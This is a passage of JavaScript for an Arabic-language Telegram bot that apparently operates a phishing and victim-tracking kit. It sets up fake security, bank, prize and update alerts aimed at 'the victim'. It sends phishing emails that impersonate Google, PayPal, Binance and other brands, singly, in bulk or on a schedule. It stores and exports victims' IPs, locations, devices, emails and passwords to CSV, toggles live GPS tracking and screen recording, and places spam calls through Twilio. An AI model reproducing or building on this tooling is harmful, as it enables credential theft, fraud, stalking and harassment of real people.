    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>التحذير الأمني العاجل</b>\n\n📌 ستظهر للضحية كتنبيه أمني مقنع.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_hacked"){
    userFakeMsg.set(chatId, {type: "hacked", title: "🚨 تم اختراق حسابك!", msg: "تم الكشف عن محاولة اختراق لحسابك! تم تسجيل الدخول من موقع جغرافي مختلف. اضغط موافق لتأمين حسابك الآن.", icon: "🛡️", color: "#ff0000"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>تم اختراق حسابك</b>\n\n📌 رسالة مخيفة تدفع الضحية للتفاعل.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_login_alert"){
    userFakeMsg.set(chatId, {type: "login_alert", title: "🔔 محاولة دخول مشبوهة", msg: "تم محاولة تسجيل الدخول إلى حسابك من:\n📍 الموقع: غير معروف\n📱 الجهاز: جهاز جديد\n\nإذا لم تكن أنت، اضغط موافق لتأمين حسابك.", icon: "⚠️", color: "#ff6600"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>محاولة دخول مشبوهة</b>\n\n📌 تتضمن تفاصيل مقنعة.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_prize"){
    userFakeMsg.set(chatId, {type: "prize", title: "🎉 تهانينا! لقد ربحت!", msg: "مبروك! لقد تم اختيارك عشوائياً للفوز بجائزة قيمة!\n\n🎁 الجائزة: iPhone 15 Pro Max\n\nاضغط موافق للمطالبة بجائزتك الآن!", icon: "🏆", color: "#28a745"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>الجائزة</b>\n\n📌 رسالة جذابة بجائزة مغرية.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_money"){
    userFakeMsg.set(chatId, {type: "money", title: "💰 لقد ربحت مبلغاً مالياً!", msg: "تهانينا! لقد ربحت $10,000 في السحب العشوائي!\n\n💵 المبلغ: $10,000\n📅 الصلاحية: 24 ساعة\n\nاضغط موافق لاستلام أموالك!", icon: "💵", color: "#ffc107"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>ربحت مبلغ مالي</b>\n\n📌 رسالة مغرية بمبلغ كبير.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_gift"){
    userFakeMsg.set(chatId, {type: "gift", title: "🎁 لديك هدية مجانية!", msg: "تم إرسال هدية مجانية إليك من صديق!\n\n🎀 نوع الهدية: بطاقة هدايا\n💰 القيمة: $500\n\nاضغط موافق لفتح هديتك!", icon: "🎀", color: "#e91e63"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>هدية مجانية</b>\n\n📌 رسالة جذابة بهدية.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_winner"){
    userFakeMsg.set(chatId, {type: "winner", title: "🏆 أنت الفائز الوحيد!", msg: "مبروك! تم اختيارك كالفائز الوحيد من بين 1,000,000 مشترك!\n\n🥇 المركز: الأول\n🎁 الجائزة: سيارة فاخرة\n\nاضغط موافق لتأكيد فوزك!", icon: "👑", color: "#9c27b0"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>أنت الفائز</b>\n\n📌 رسالة مثيرة بجائزة كبيرة.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_update"){
    userFakeMsg.set(chatId, {type: "update", title: "🔄 تحديث أمني مطلوب", msg: "يجب تثبيت التحديث الأمني الجديد للمتابعة.\n\n📦 الإصدار: 2024.1.5\n🔒 نوع: تحديث أمني حرج\n\nاضغط موافق لتثبيت التحديث.", icon: "⬇️", color: "#17a2b8"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>التحديث المطلوب</b>\n\n📌 رسالة تقنية مقنعة.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_app_update"){
    userFakeMsg.set(chatId, {type: "app_update", title: "📲 تحديث التطبيق متاح", msg: "يتوفر تحديث جديد للتطبيق يتضمن:\n\n✨ ميزات جديدة\n🐛 إصلاح الأخطاء\n🔒 تحسينات أمنية\n\nاضغط موافق للتحديث الآن.", icon: "📱", color: "#007bff"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>تحديث التطبيق</b>\n\n📌 رسالة تشبه إشعارات التحديث.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_error"){
    userFakeMsg.set(chatId, {type: "error", title: "⚡ خطأ في النظام", msg: "حدث خطأ غير متوقع في النظام!\n\n❌ رمز الخطأ: 0x80070005\n📋 الحل: إعادة التحقق\n\nاضغط موافق لإصلاح المشكلة.", icon: "⚠️", color: "#dc3545"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>خطأ في النظام</b>\n\n📌 رسالة تقنية تبدو حقيقية.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_battery"){
    userFakeMsg.set(chatId, {type: "battery", title: "🔋 تحذير البطارية", msg: "البطارية منخفضة جداً (5%)!\n\n⚡ وضع توفير الطاقة مطلوب\n🔌 يرجى شحن الجهاز\n\nاضغط موافق لتفعيل وضع الطوارئ.", icon: "🪫", color: "#ff5722"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>البطارية منخفضة</b>\n\n📌 رسالة تشبه تنبيهات النظام.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_message"){
    userFakeMsg.set(chatId, {type: "message", title: "💌 لديك رسالة جديدة!", msg: "تلقيت رسالة جديدة من شخص يعرفك!\n\n👤 المرسل: صديق قديم\n📝 الموضوع: أخبار مهمة\n\nاضغط موافق لقراءة الرسالة.", icon: "✉️", color: "#6c757d"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>الرسالة الجديدة</b>\n\n📌 رسالة تثير الفضول.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_email_msg"){
    userFakeMsg.set(chatId, {type: "email", title: "📧 بريد إلكتروني مهم", msg: "لديك بريد إلكتروني عاجل يتطلب انتباهك!\n\n📬 من: support@security.com\n📋 الموضوع: إجراء مطلوب\n\nاضغط موافق للاطلاع على التفاصيل.", icon: "📨", color: "#795548"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>بريد مهم</b>\n\n📌 رسالة رسمية.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_missed_call"){
    userFakeMsg.set(chatId, {type: "missed_call", title: "📞 مكالمة فائتة", msg: "لديك مكالمة فائتة من رقم مهم!\n\n📱 الرقم: +1 XXX-XXX-XXXX\n⏰ الوقت: منذ 5 دقائق\n🔄 المحاولات: 3\n\nاضغط موافق لمعاودة الاتصال.", icon: "📲", color: "#4caf50"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>مكالمة فائتة</b>\n\n📌 رسالة تشبه إشعارات المكالمات.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_whatsapp"){
    userFakeMsg.set(chatId, {type: "whatsapp", title: "💬 رسالة واتساب جديدة", msg: "لديك رسالة واتساب لم تُقرأ!\n\n👤 من: جهة اتصال مهمة\n📝 المعاينة: \"مرحباً، أحتاج مساعدتك في...\"\n\nاضغط موافق لفتح المحادثة.", icon: "💬", color: "#25D366"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>رسالة واتساب</b>\n\n📌 رسالة تشبه إشعارات واتساب.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_bank_alert"){
    userFakeMsg.set(chatId, {type: "bank_alert", title: "🏦 تنبيه من البنك", msg: "تم رصد معاملة مشبوهة على حسابك!\n\n💳 المبلغ: $2,500\n📍 الموقع: دولة أجنبية\n⏰ الوقت: الآن\n\nإذا لم تكن أنت، اضغط موافق لإيقاف المعاملة.", icon: "🏛️", color: "#1a237e"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>تنبيه البنك</b>\n\n📌 رسالة بنكية مخيفة.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_card"){
    userFakeMsg.set(chatId, {type: "card", title: "💳 بطاقتك معلقة!", msg: "تم تعليق بطاقتك المصرفية مؤقتاً!\n\n❌ السبب: نشاط غير معتاد\n🔒 الحالة: معلقة\n\nاضغط موافق للتحقق من هويتك وإعادة تفعيل البطاقة.", icon: "💳", color: "#c62828"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>بطاقتك معلقة</b>\n\n📌 رسالة مالية عاجلة.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_transfer"){
    userFakeMsg.set(chatId, {type: "transfer", title: "💸 تحويل مالي جديد", msg: "تم استلام تحويل مالي جديد!\n\n💰 المبلغ: $5,000\n👤 المرسل: غير معروف\n📋 الحالة: في انتظار القبول\n\nاضغط موافق لقبول التحويل.", icon: "💵", color: "#2e7d32"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>تحويل مالي</b>\n\n📌 رسالة مغرية بتحويل.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_verify"){
    userFakeMsg.set(chatId, {type: "verify", title: "🔐 مطلوب التحقق من الهوية", msg: "يرجى التحقق من هويتك لحماية حسابك.\n\n🛡️ السبب: نشاط غير معتاد\n⏰ المهلة: 24 ساعة\n\nاضغط موافق لبدء عملية التحقق.", icon: "✅", color: "#0288d1"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>التحقق من الهوية</b>\n\n📌 رسالة رسمية للتحقق.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_session"){
    userFakeMsg.set(chatId, {type: "session", title: "⏰ انتهت صلاحية الجلسة", msg: "انتهت جلستك لأسباب أمنية!\n\n🔒 السبب: انتهاء المهلة\n📱 الجهاز: هذا الجهاز\n\nيرجى تسجيل الدخول مرة أخرى للمتابعة.", icon: "🔄", color: "#546e7a"});
    bot.sendMessage(chatId, "✅ تم تفعيل رسالة <b>انتهاء الجلسة</b>\n\n📌 رسالة تقنية للجلسة.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_clear"){
    userFakeMsg.delete(chatId);
    bot.sendMessage(chatId, "❌ تم إلغاء الرسالة الوهمية.\n\nلن تظهر أي رسالة للضحية عند فتح الرابط التالي.", {parse_mode: "HTML"});
} else if(callbackQuery.data=="fake_custom"){
    waitingFakeCustom.add(chatId);
    bot.sendMessage(chatId, "✏️ <b>رسالة مخصصة</b>\n\nأرسل الرسالة التي تريد إظهارها للضحية بالشكل التالي:\n\n<code>العنوان | نص الرسالة</code>\n\n<i>مثال:</i>\n<code>تنبيه هام! | تم حظر حسابك مؤقتاً. اضغط موافق للاستئناف.</code>", {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
} else if(callbackQuery.data=="fake_email"){
    const emailButtons = {
        inline_keyboard: [
            [{text: "🔍 Google", callback_data: "email_google"}, {text: "📘 Facebook", callback_data: "email_facebook"}],
            [{text: "📷 Instagram", callback_data: "email_instagram"}, {text: "💬 WhatsApp", callback_data: "email_whatsapp"}],
            [{text: "🍎 Apple", callback_data: "email_apple"}, {text: "🪟 Microsoft", callback_data: "email_microsoft"}],
            [{text: "📦 Amazon", callback_data: "email_amazon"}, {text: "💰 PayPal", callback_data: "email_paypal"}],
            [{text: "🎬 Netflix", callback_data: "email_netflix"}, {text: "🏦 البنك", callback_data: "email_bank"}],
            [{text: "🚗 Uber", callback_data: "email_uber"}, {text: "🎵 Spotify", callback_data: "email_spotify"}],
            [{text: "💬 Discord", callback_data: "email_discord"}, {text: "💰 Binance", callback_data: "email_binance"}],
            [{text: "✈️ Telegram", callback_data: "email_telegram_app"}],
            [{text: "✏️ مخصص", callback_data: "email_custom"}],
            [{text: "📧 بريد جماعي", callback_data: "bulk_email"}],
            [{text: "⏰ جدولة بريد", callback_data: "schedule_email"}],
            [{text: "🔙 رجوع", callback_data: "back_main"}]
        ]
    };
    bot.sendMessage(chatId, `📧 <b>بريد وهمي</b>\n\nاختر الشركة:`, {parse_mode: "HTML", reply_markup: JSON.stringify(emailButtons)});
} else if(callbackQuery.data.startsWith("email_")){
    const template = callbackQuery.data.replace("email_", "");
    if(template === "custom") {
        emailState.set(chatId, {step: "custom_name"});
        bot.sendMessage(chatId, "✏️ أرسل اسم الشركة المستعارة:", {reply_markup: JSON.stringify({"force_reply": true})});
    } else if(emailTemplates[template]) {
        emailState.set(chatId, {step: "target_email", template: template});
        bot.sendMessage(chatId, `📧 تم اختيار: <b>${emailTemplates[template].name}</b>\n\nأرسل الآن البريد الإلكتروني للضحية:`, {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
    }
} else if(callbackQuery.data=="mystats"){
    try {
        const victimsRes = await pool.query(`SELECT COUNT(*) as total, COUNT(CASE WHEN is_vpn THEN 1 END) as vpn_count FROM victims WHERE user_id = $1`, [chatId.toString(36)]);
        const credsRes = await pool.query(`SELECT COUNT(*) as total FROM credentials WHERE user_id = $1`, [chatId.toString(36)]);
        const countriesRes = await pool.query(`SELECT country, COUNT(*) as cnt FROM victims WHERE user_id = $1 GROUP BY country ORDER BY cnt DESC LIMIT 5`, [chatId.toString(36)]);
        const todayRes = await pool.query(`SELECT COUNT(*) as cnt FROM victims WHERE user_id = $1 AND DATE(created_at) = CURRENT_DATE`, [chatId.toString(36)]);
        const yesterdayRes = await pool.query(`SELECT COUNT(*) as cnt FROM victims WHERE user_id = $1 AND DATE(created_at) = CURRENT_DATE - INTERVAL '1 day'`, [chatId.toString(36)]);
        const topDeviceRes = await pool.query(`SELECT device, COUNT(*) as cnt FROM victims WHERE user_id = $1 AND device IS NOT NULL GROUP BY device ORDER BY cnt DESC LIMIT 1`, [chatId.toString(36)]);
        const topBrowserRes = await pool.query(`SELECT browser, COUNT(*) as cnt FROM victims WHERE user_id = $1 AND browser IS NOT NULL GROUP BY browser ORDER BY cnt DESC LIMIT 1`, [chatId.toString(36)]);

        const total = parseInt(victimsRes.rows[0]?.total || 0);
        const vpnCount = parseInt(victimsRes.rows[0]?.vpn_count || 0);
        const vpnPct = total > 0 ? ((vpnCount / total) * 100).toFixed(1) : '0';
        const todayCount = parseInt(todayRes.rows[0]?.cnt || 0);
        const yesterdayCount = parseInt(yesterdayRes.rows[0]?.cnt || 0);
        const diff = todayCount - yesterdayCount;
        const trendArrow = diff > 0 ? `↑ +${diff}` : diff < 0 ? `↓ ${diff}` : '→ 0';

        const countryFlags = {'Saudi Arabia':'🇸🇦','Egypt':'🇪🇬','United Arab Emirates':'🇦🇪','Jordan':'🇯🇴','Iraq':'🇮🇶','Morocco':'🇲🇦','Kuwait':'🇰🇼','Qatar':'🇶🇦','Bahrain':'🇧🇭','Oman':'🇴🇲','Lebanon':'🇱🇧','Tunisia':'🇹🇳','Algeria':'🇩🇿','Libya':'🇱🇾','Sudan':'🇸🇩','Yemen':'🇾🇪','Syria':'🇸🇾','Palestine':'🇵🇸','United States':'🇺🇸','United Kingdom':'🇬🇧','Germany':'🇩🇪','France':'🇫🇷','Turkey':'🇹🇷','India':'🇮🇳'};

        let statsMsg = `📊 <b>إحصائياتك</b>\n\n`;
        statsMsg += `👥 الضحايا: <b>${total}</b>\n`;
        statsMsg += `📅 اليوم: <b>${todayCount}</b> ${trendArrow}\n`;
        statsMsg += `🔐 كريدنشلز: <b>${credsRes.rows[0]?.total || 0}</b>\n`;
        statsMsg += `🛡 VPN: <b>${vpnCount}</b> (${vpnPct}%)\n`;

        if(countriesRes.rows.length > 0) {
            const topCountry = countriesRes.rows[0];
            const flag = countryFlags[topCountry.country] || '🏳️';
            statsMsg += `\n🏆 أعلى دولة: ${flag} ${topCountry.country} (${topCountry.cnt})\n`;
            statsMsg += `\n🌍 <b>الدول:</b>\n`;
            countriesRes.rows.forEach((r, i) => {
                const f = countryFlags[r.country] || '🏳️';
                statsMsg += `  ${i+1}. ${f} ${r.country}: ${r.cnt}\n`;
            });
        }

        if(topBrowserRes.rows.length > 0) {
            statsMsg += `\n🌐 المتصفح: ${topBrowserRes.rows[0].browser} (${topBrowserRes.rows[0].cnt})`;
        }
        if(topDeviceRes.rows.length > 0) {
            statsMsg += `\n📱 الجهاز: ${topDeviceRes.rows[0].device} (${topDeviceRes.rows[0].cnt})`;
        }

        bot.sendMessage(chatId, statsMsg, {parse_mode: "HTML"});
    } catch(e) {
        bot.sendMessage(chatId, "📊 لا توجد بيانات بعد. ابدأ بإنشاء روابط!", {parse_mode: "HTML"});
    }
} else if(callbackQuery.data=="myvictims"){
    try {
        const res = await pool.query(`SELECT ip, country, city, template, is_vpn, created_at FROM victims WHERE user_id = $1 ORDER BY created_at DESC LIMIT 10`, [chatId.toString(36)]);
        
        if(res.rows.length === 0) {
            bot.sendMessage(chatId, "🗄️ لا يوجد ضحايا بعد!", {parse_mode: "HTML"});
            return;
        }
        
        let msg = `📋 <b>آخر 10 ضحايا</b>\n\n`;
        res.rows.forEach((v, i) => {
            const vpnTag = v.is_vpn ? '🔴' : '🟢';
            msg += `${i+1}. ${vpnTag} <code>${v.ip}</code>\n   ${v.city}, ${v.country} — ${v.template}\n\n`;
        });
        
        bot.sendMessage(chatId, msg, {parse_mode: "HTML"});
    } catch(e) {
        bot.sendMessage(chatId, "خطأ في جلب البيانات", {parse_mode: "HTML"});
    }
} else if(callbackQuery.data=="export_csv"){
    try {
        const victimsRes = await pool.query(`SELECT ip, country, city, device, browser, template, is_vpn, latitude, longitude, created_at FROM victims WHERE user_id = $1 ORDER BY created_at DESC LIMIT 100`, [chatId.toString(36)]);
        const credsRes = await pool.query(`SELECT platform, email, password, phone, created_at FROM credentials WHERE user_id = $1 ORDER BY created_at DESC LIMIT 100`, [chatId.toString(36)]);
        
        if(victimsRes.rows.length === 0 && credsRes.rows.length === 0) {
            bot.sendMessage(chatId, "📤 لا توجد بيانات للتصدير!", {parse_mode: "HTML"});
            return;
        }
        
        let csvContent = "=== VICTIMS ===\nIP,Country,City,Device,Browser,Template,VPN,Lat,Lon,Date\n";
        victimsRes.rows.forEach(v => {
            csvContent += `${v.ip},${v.country},${v.city},${v.device || ''},${v.browser || ''},${v.template},${v.is_vpn},${v.latitude || ''},${v.longitude || ''},${v.created_at}\n`;
        });
        
        csvContent += "\n=== CREDENTIALS ===\nPlatform,Email,Password,Phone,Date\n";
        credsRes.rows.forEach(c => {
            csvContent += `${c.platform},${c.email},${c.password},${c.phone || ''},${c.created_at}\n`;
        });
        
        const buffer = Buffer.from(csvContent, 'utf-8');
        bot.sendDocument(chatId, buffer, {caption: "📤 بياناتك المصدّرة"}, {filename: 'trackdown_export.csv', contentType: 'text/csv'});
    } catch(e) {
        bot.sendMessage(chatId, "❌ خطأ في التصدير: " + e.message, {parse_mode: "HTML"});
    }
} else if(callbackQuery.data=="block_ip"){
    bot.sendMessage(chatId, "🚫 <b>حظر IP</b>\n\nأرسل عنوان IP لحظره:\n\nمثال: <code>192.168.1.1</code>", {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
} else if(callbackQuery.data=="spamcalls"){
    if(!twilioClient) {
        bot.sendMessage(chatId, "⚠️ <b>خدمة Twilio غير مفعّلة!</b>\n\nيرجى إضافة بيانات Twilio في الإعدادات:\n• TWILIO_SID\n• TWILIO_TOKEN\n• TWILIO_NUMBER", {parse_mode: "HTML"});
        return;
    }
    bot.sendMessage(chatId, "📞 <b>أداة المكالمات الحقيقية</b>\n\n⚠️ <b>تحذير:</b> هذه مكالمات حقيقية عبر Twilio!\n\nأدخل رقم الهدف مع رمز الدولة:\n(مثال: +966501234567)", {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
} else if(callbackQuery.data=="callmenu"){
    bot.sendMessage(chatId, "📞 <b>اختر نوع المكالمة:</b>", {
        parse_mode: "HTML",
        reply_markup: JSON.stringify({
            "inline_keyboard": [
                [{text: "🔔 مكالمة واحدة", callback_data: "call_single"}],
                [{text: "📢 5 مكالمات متتالية", callback_data: "call_spam5"}],
                [{text: "🔙 رجوع", callback_data: "back_main"}]
            ]
        })
    });
} else if(callbackQuery.data=="bulk_email"){
    emailState.set(chatId, {step: "bulk_company"});
    const companyButtons = {
        inline_keyboard: [
            [{text: "🔍 Google", callback_data: "bulk_google"}, {text: "📘 Facebook", callback_data: "bulk_facebook"}],
            [{text: "📷 Instagram", callback_data: "bulk_instagram"}, {text: "💬 WhatsApp", callback_data: "bulk_whatsapp"}],
            [{text: "🍎 Apple", callback_data: "bulk_apple"}, {text: "🪟 Microsoft", callback_data: "bulk_microsoft"}],
            [{text: "🔙 رجوع", callback_data: "fake_email"}]
        ]
    };
    bot.sendMessage(chatId, `📧 <b>بريد جماعي</b>\n\nاختر الشركة:`, {parse_mode: "HTML", reply_markup: JSON.stringify(companyButtons)});
} else if(callbackQuery.data.startsWith("bulk_") && callbackQuery.data !== "bulk_email"){
    const company = callbackQuery.data.replace("bulk_", "");
    emailState.set(chatId, {step: "bulk_emails", company: company});
    bot.sendMessage(chatId, `📧 <b>بريد جماعي - ${emailTemplates[company]?.name || company}</b>\n\nأرسل قائمة البريد الإلكتروني (كل بريد بسطر):\n\n<code>email1@example.com\nemail2@example.com\nemail3@example.com</code>`, {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
} else if(callbackQuery.data=="schedule_email"){
    emailState.set(chatId, {step: "schedule_company"});
    const companyButtons = {
        inline_keyboard: [
            [{text: "🔍 Google", callback_data: "sched_google"}, {text: "📘 Facebook", callback_data: "sched_facebook"}],
            [{text: "📷 Instagram", callback_data: "sched_instagram"}, {text: "💬 WhatsApp", callback_data: "sched_whatsapp"}],
            [{text: "🔙 رجوع", callback_data: "fake_email"}]
        ]
    };
    bot.sendMessage(chatId, `⏰ <b>جدولة بريد</b>\n\nاختر الشركة:`, {parse_mode: "HTML", reply_markup: JSON.stringify(companyButtons)});
} else if(callbackQuery.data.startsWith("sched_")){
    const company = callbackQuery.data.replace("sched_", "");
    emailState.set(chatId, {step: "schedule_email_target", company: company});
    bot.sendMessage(chatId, `⏰ <b>جدولة بريد - ${emailTemplates[company]?.name || company}</b>\n\nأرسل البريد الإلكتروني للضحية:`, {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
} else if(callbackQuery.data=="qr_code"){
    bot.sendMessage(chatId, `📱 <b>QR Code Generator</b>\n\nأرسل الرابط لتحويله لـ QR Code:`, {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
    waitingQRCode.add(chatId);
} else if(callbackQuery.data=="advanced_stats"){
    try {
        const todayVictims = await pool.query(`SELECT COUNT(*) as cnt FROM victims WHERE user_id = $1 AND DATE(created_at) = CURRENT_DATE`, [chatId.toString(36)]);
        const yesterdayVictims = await pool.query(`SELECT COUNT(*) as cnt FROM victims WHERE user_id = $1 AND DATE(created_at) = CURRENT_DATE - INTERVAL '1 day'`, [chatId.toString(36)]);
        const weekVictims = await pool.query(`SELECT COUNT(*) as cnt FROM victims WHERE user_id = $1 AND created_at > NOW() - INTERVAL '7 days'`, [chatId.toString(36)]);
        const monthVictims = await pool.query(`SELECT COUNT(*) as cnt FROM victims WHERE user_id = $1 AND created_at > NOW() - INTERVAL '30 days'`, [chatId.toString(36)]);
        const totalVictims = await pool.query(`SELECT COUNT(*) as cnt FROM victims WHERE user_id = $1`, [chatId.toString(36)]);
        const topBrowsers = await pool.query(`SELECT browser, COUNT(*) as cnt FROM victims WHERE user_id = $1 GROUP BY browser ORDER BY cnt DESC LIMIT 5`, [chatId.toString(36)]);
        const topDevices = await pool.query(`SELECT device, COUNT(*) as cnt FROM victims WHERE user_id = $1 GROUP BY device ORDER BY cnt DESC LIMIT 5`, [chatId.toString(36)]);

        const todayCount = parseInt(todayVictims.rows[0]?.cnt || 0);
        const yesterdayCount = parseInt(yesterdayVictims.rows[0]?.cnt || 0);
        const totalCount = parseInt(totalVictims.rows[0]?.cnt || 0);
        const diff = todayCount - yesterdayCount;
        const trendArrow = diff > 0 ? `↑ +${diff}` : diff < 0 ? `↓ ${diff}` : '→ 0';

        let msg = `📈 <b>إحصائيات متقدمة</b>\n\n`;
        msg += `📅 اليوم: <b>${todayCount}</b> ${trendArrow}\n`;
        msg += `📅 أمس: <b>${yesterdayCount}</b>\n`;
        msg += `📅 الأسبوع: <b>${weekVictims.rows[0]?.cnt || 0}</b>\n`;
        msg += `📅 الشهر: <b>${monthVictims.rows[0]?.cnt || 0}</b>\n`;

        if(topBrowsers.rows.length > 0) {
            msg += `\n🌐 <b>المتصفحات:</b>\n`;
            topBrowsers.rows.forEach((r, i) => {
                const pct = totalCount > 0 ? ((parseInt(r.cnt) / totalCount) * 100).toFixed(1) : '0';
                msg += `  ${i+1}. ${r.browser || 'غير معروف'}: ${r.cnt} (${pct}%)\n`;
            });
        }

        if(topDevices.rows.length > 0) {
            msg += `\n📱 <b>الأجهزة:</b>\n`;
            topDevices.rows.forEach((r, i) => {
                const pct = totalCount > 0 ? ((parseInt(r.cnt) / totalCount) * 100).toFixed(1) : '0';
                msg += `  ${i+1}. ${r.device || 'غير معروف'}: ${r.cnt} (${pct}%)\n`;
            });
        }

        bot.sendMessage(chatId, msg, {parse_mode: "HTML"});
    } catch(e) {
        bot.sendMessage(chatId, "📊 لا توجد بيانات كافية بعد.", {parse_mode: "HTML"});
    }
} else if(callbackQuery.data=="daily_report"){
    const settings = userSettings.get(chatId) || {};
    settings.dailyReport = !settings.dailyReport;
    userSettings.set(chatId, settings);
    bot.sendMessage(chatId, `📋 <b>التقارير اليومية:</b> ${settings.dailyReport ? '✅ مفعّلة' : '❌ معطّلة'}\n\n${settings.dailyReport ? 'ستصلك إحصائيات يومية كل 24 ساعة.' : 'لن تصلك تقارير تلقائية.'}`, {parse_mode: "HTML"});
} else if(callbackQuery.data=="screen_record"){
    bot.sendMessage(chatId, `📹 <b>تسجيل الشاشة</b>\n\n⚠️ هذه الميزة تتطلب موافقة المستخدم عبر المتصفح.\n\nعند إنشاء رابط جديد، سيُطلب من الضحية السماح بمشاركة الشاشة.\n\n✅ الميزة مفعّلة تلقائياً في جميع القوالب.`, {parse_mode: "HTML"});
} else if(callbackQuery.data=="live_gps"){
    const settings = userSettings.get(chatId) || {};
    settings.liveGPS = !settings.liveGPS;
    userSettings.set(chatId, settings);
    bot.sendMessage(chatId, `📍 <b>تتبع GPS المستمر:</b> ${settings.liveGPS ? '✅ مفعّل' : '❌ معطّل'}\n\n${settings.liveGPS ? 'سيتم إرسال موقع الضحية كل 60 ثانية.' : 'سيتم إرسال الموقع مرة واحدة فقط.'}`, {parse_mode: "HTML"});
} else if(callbackQuery.data=="resend_location"){
    const loc = lastKnownLocation.get(chatId);
    if(loc) {
        const mapsUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
        const latDir = loc.lat >= 0 ? 'شمال' : 'جنوب';
        const lonDir = loc.lon >= 0 ? 'شرق' : 'غرب';
        const latAbs = Math.abs(loc.lat).toFixed(6);
        const lonAbs = Math.abs(loc.lon).toFixed(6);
        const accText = loc.acc && loc.acc !== '0' && loc.acc !== 'null' ? `\n🎯 <b>الدقة:</b> ${Math.round(parseFloat(loc.acc))} متر` : '';
        bot.sendLocation(chatId, loc.lat, loc.lon);
        bot.sendMessage(chatId, `🔄 <b>الموقع الأخير</b>\n\n🌐 ${latAbs}° ${latDir}, ${lonAbs}° ${lonDir}${accText}\n⏰ ${loc.time}\n\n🗺 <a href="${mapsUrl}">فتح الخريطة</a>`, {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: JSON.stringify({
                inline_keyboard: [[{text: "🔄 إعادة إرسال", callback_data: "resend_location"}]]
            })
        });
    } else {
        bot.sendMessage(chatId, "📍 لا يوجد موقع محفوظ بعد!", {parse_mode: "HTML"});
    }
} else if(callbackQuery.data=="search_victim"){
    bot.sendMessage(chatId, "🔍 <b>بحث عن ضحية</b>\n\nأرسل IP أو اسم الدولة أو اسم المتصفح للبحث:", {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
} else if(callbackQuery.data=="notes_menu"){
    const notes = victimNotes.get(chatId) || {};
    const notesList = Object.entries(notes).map(([ip, note]) => `• <code>${ip}</code>: ${note}`).join('\n') || 'لا توجد ملاحظات';
    bot.sendMessage(chatId, `📝 <b>الملاحظات</b>\n\n${notesList}\n\n💡 لإضافة ملاحظة أرسل:\n<code>/note IP النص</code>\n\nمثال:\n<code>/note 192.168.1.1 ضحية مهمة</code>`, {parse_mode: "HTML"});
} else if(callbackQuery.data.startsWith("block_")){
    const ip = callbackQuery.data.replace("block_","");
    if(ip !== "ip"){
        blockedIPs.set(ip, {reason: "Manual block", time: new Date()});
        bot.sendMessage(chatId, `🚫 تم حظر IP: <code>${ip}</code>`, {parse_mode: "HTML"});
    }
} else if(callbackQuery.data.startsWith("cat_vip_")){
    const ip = callbackQuery.data.replace("cat_vip_","");
    victimCategories.set(ip, "VIP");
    bot.sendMessage(chatId, `⭐ تم تصنيف <code>${ip}</code> كـ VIP`, {parse_mode: "HTML"});
} else if(callbackQuery.data.startsWith("cat_imp_")){
    const ip = callbackQuery.data.replace("cat_imp_","");
    victimCategories.set(ip, "Important");
    bot.sendMessage(chatId, `🔴 تم تصنيف <code>${ip}</code> كـ مهم`, {parse_mode: "HTML"});
} else if(callbackQuery.data === "ip_lookup"){
    adminChatIds.add(chatId);
    aiWaitingFor.set(chatId, 'ip_lookup');
    aiChatMode.delete(chatId);
    bot.sendMessage(chatId, '🌐 أرسل عنوان IP للفحص السريع (عام أو خاص):', { reply_markup: { force_reply: true } });
} else if(callbackQuery.data === "ai_chat"){
    adminChatIds.add(chatId);
    aiChatMode.set(chatId, true);
    aiWaitingFor.delete(chatId);
    bot.sendMessage(chatId, `💬 <b>وضع المحادثة الذكية</b>\n\n✅ تم تفعيل وضع المحادثة!\nأرسل أي رسالة وسأجيبك فوراً.\nالمحادثة مستمرة وأتذكر كل ما قلته.`, {
